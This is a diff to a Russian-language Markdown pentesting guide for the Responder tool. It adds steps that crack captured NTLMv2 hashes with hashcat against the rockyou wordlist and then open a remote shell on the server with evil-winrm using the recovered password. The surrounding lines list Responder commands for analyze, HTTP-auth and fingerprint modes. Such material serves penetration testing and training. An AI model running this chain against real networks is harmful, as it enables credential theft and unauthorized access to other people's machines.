@@ -10,7 +10,11 @@
 ```Python
 responder -A -I eth0
 ```
+Перехватив NTLMv2 хеш, положим их в файл `tickets.txt` и попробуем восстановить пароли аккаунтов, отправивших нам хеши:  
+`hashcat -a 0 -w 4 -m 5600 tickets.txt /usr/share/wordlists/rockyou.txt`
 
+После получения пароля воспользуемся утилитой [evil-winrm](https://github.com/Hackplayers/evil-winrm) для получения удобного доступа к терминальной оболочке сервера:  
+`evil-winrm -i [ip] -u [username] -p [password]`
 ## Атака HTTP Auth
 **Команда для запуска режима:**
 ```python
@@ -22,3 +26,4 @@ responder -b -I eth0
 ```python
 responder -f -I eth0
 ```
+
